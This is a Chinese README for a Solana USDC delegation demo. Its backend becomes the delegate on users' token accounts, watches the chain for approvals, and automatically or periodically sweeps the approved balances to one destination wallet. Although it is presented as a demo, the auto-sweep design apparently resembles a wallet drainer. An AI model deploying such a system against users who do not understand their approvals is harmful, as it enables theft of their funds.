# aurora-ops

[English](./README.md) | 简体中文

一个基于 TypeScript 的 Solana USDC 授权监听与代扣演示项目。

它实现了 Solana 上最接近以太坊 `approve + transferFrom` 的交互模式：

1. 用户通过 `ApproveChecked` 把某个 USDC Token Account 授权给后台地址作为 `delegate`
2. 后台通过 `TransferChecked` 使用这笔授权额度，把 USDC 转移到目标地址
3. 后台还可以监听链上授权状态变化，自动识别被授权账户并执行后续处理

当前选定的 GitHub 项目名称：

- `aurora-ops`

## 项目能力

- 支持构建 `ApproveChecked` 未签名交易，由 Phantom 等钱包签名发送
- 支持后台以 `delegate` 身份发起 `TransferChecked`
- 支持链上监听 `delegate == backend` 的 USDC Token Account
- 支持按照 `min(balance, delegatedAmount)` 计算可转金额
- 支持 MySQL 持久化授权状态与转账历史
- 支持独立授权列表页查看已授权地址、余额、授权额度和可转额度
- 支持从 `.env` 读取默认目标地址，前端列表页可直接按记录触发转账
- 支持定时巡检任务，按授权阈值和余额阈值自动归集到目标地址

## 技术栈

- 后端：Node.js、TypeScript、Express
- 前端：React、Vite
- 链上 SDK：`@solana/web3.js`、`@solana/spl-token`
- 数据库：MySQL（可选）

## 目录结构

```text
.
├── src/
│   ├── components/          # 前端页面组件
│   ├── hooks/               # 前端钱包 hooks
│   ├── utils/               # 前端工具函数和测试
│   ├── App.tsx              # 前端主页面与路由切换
│   ├── config.ts            # .env 配置集中解析
│   ├── index.ts             # 后端 API、监听器、自动转账入口
│   └── mysql.ts             # MySQL 持久化层
├── .env.example             # 环境变量模板
├── README.md                # 英文项目说明
├── README.zh-CN.md          # 中文项目说明
└── DEPLOYMENT.md            # 部署文档
```

## 核心流程

### 1. 用户授权

用户钱包对某个 USDC Token Account 签署 `ApproveChecked`，把后台地址设置为 `delegate`。

### 2. 后台识别授权

后端通过 `getProgramAccounts` 和 `onProgramAccountChange` 只监听：

- `mint == USDC_MINT`
- `delegate == BACKEND_PUBLIC_KEY`

### 3. 后台计算可转金额

后端读取链上账户状态，并按以下规则确定可转额度：

```text
transferableAmount = min(balance, delegatedAmount)
```

### 4. 后台执行代扣

当满足条件时，后台用自身私钥签名 `TransferChecked`，把 USDC 转到目标地址的 ATA。

## 页面说明

### 首页

首页主要用于模拟完整流程：

- 连接 Phantom
- 构建授权交易
- 触发后台 delegate 转账
- 查看最近一次授权与转账结果

### 授权列表页

授权列表页用于查看大量已授权记录，地址建议：

```text
http://localhost:5173/#/approvals
```

该页面支持：

- 展示授权钱包地址
- 展示 Source ATA
- 展示授权金额
- 展示当前 USDC 余额
- 展示当前可转金额
- 直接按记录触发后台转账

目标地址不再由前端输入，而是统一来自 `.env` 中的 `DEFAULT_DESTINATION_OWNER`。

## 环境变量

运行前请先复制模板：

```bash
cp .env.example .env
```

当前支持的主要环境变量：

```env
PORT=3000
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
SOLANA_COMMITMENT=confirmed
USDC_MINT=EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v
BACKEND_SECRET_KEY=
DEFAULT_DESTINATION_OWNER=
ENABLE_APPROVAL_LISTENER=true
ENABLE_AUTO_TRANSFER=true
ENABLE_SCHEDULED_SWEEP=false
SCHEDULED_SWEEP_INTERVAL_MS=300000
SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI=100
SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI=100
ENABLE_MYSQL_PERSISTENCE=false
MYSQL_DSN=mysql://root:password@127.0.0.1:3306/solana_delegate_demo
MYSQL_CONNECTION_LIMIT=10
MYSQL_WAIT_FOR_CONNECTIONS=true
```

说明：

- `BACKEND_SECRET_KEY`：后台私钥，支持 Base58 或 JSON 数组
- `DEFAULT_DESTINATION_OWNER`：授权列表页点击转账时使用的默认目标钱包地址
- `ENABLE_APPROVAL_LISTENER`：是否开启链上授权监听
- `ENABLE_AUTO_TRANSFER`：是否监听到授权后自动执行转账
- `ENABLE_SCHEDULED_SWEEP`：是否开启定时巡检归集任务
- `SCHEDULED_SWEEP_INTERVAL_MS`：定时巡检周期，默认 `300000` 毫秒，即 5 分钟
- `SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI`：授权额度必须大于该值才会触发归集
- `SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI`：账户余额必须大于该值才会触发归集
- `ENABLE_MYSQL_PERSISTENCE`：是否开启 MySQL 持久化

如果你希望只保留“每 5 分钟按阈值归集”，建议使用下面的组合：

```env
ENABLE_AUTO_TRANSFER=false
ENABLE_SCHEDULED_SWEEP=true
SCHEDULED_SWEEP_INTERVAL_MS=300000
SCHEDULED_SWEEP_MIN_DELEGATED_AMOUNT_UI=100
SCHEDULED_SWEEP_MIN_BALANCE_AMOUNT_UI=100
```

## 本地启动

安装依赖：

```bash
npm install
```

启动前后端开发环境：

```bash
npm run dev
```

默认会启动：

- 前端：`http://localhost:5173`
- 后端：`http://localhost:3000`

如果端口被占用，Vite 可能会自动切换到其他端口。

## API 说明

### `GET /health`

返回运行时状态，例如：

- RPC 地址
- USDC Mint
- 后台 delegate 地址
- 默认目标地址
- 监听和自动转账开关
- 定时归集任务开关和阈值
- MySQL 是否启用

### `GET /approvals`

返回当前链上已授权给后台 delegate 的 USDC 账户列表。

每条记录包括：

- `sourceTokenAccount`
- `ownerWallet`
- `delegateWallet`
- `balanceUi`
- `delegatedAmountUi`
- `transferableAmountUi`

### `POST /approve/build`

为前端生成一笔未签名的 `ApproveChecked` 交易。

请求示例：

```bash
curl -X POST http://localhost:3000/approve/build \
  -H "Content-Type: application/json" \
  -d '{
    "owner": "USER_WALLET_ADDRESS",
    "amountUi": "1.25"
  }'
```

### `POST /delegate/transfer`

后台以 delegate 身份执行 USDC 转账。

请求示例：

```bash
curl -X POST http://localhost:3000/delegate/transfer \
  -H "Content-Type: application/json" \
  -d '{
    "owner": "USER_WALLET_ADDRESS",
    "amountUi": "1.25"
  }'
```

说明：

- 当未传 `destinationOwner` 时，后端会自动使用 `.env` 里的 `DEFAULT_DESTINATION_OWNER`
- 如目标 USDC ATA 不存在，后台会自动创建

## MySQL 持久化

启用 MySQL 后，后端会自动创建数据库和以下两张表：

- `approval_transfer_records`：每个 Source Token Account 的最新状态
- `approval_transfer_history`：监听与转账的追加历史表

典型状态包括：

- `approved`
- `processing`
- `duplicate`
- `skipped`
- `transferred`
- `failed`
- `delegate_mismatch`

## 开发命令

```bash
npm run dev        # 同时启动前后端开发模式
npm run dev:api    # 仅启动后端
npm run dev:web    # 仅启动前端
npm run build      # 构建前端
npm run check      # 类型检查 + 单元测试
npm run test       # 运行测试
```

## 安全提示

- 不要提交真实的 `.env`
- 不要提交生产私钥
- `BACKEND_SECRET_KEY` 必须通过安全方式注入
- 生产环境建议增加鉴权、请求签名、限流和审计日志

## 部署文档

详见：

- [DEPLOYMENT.md](./DEPLOYMENT.md)
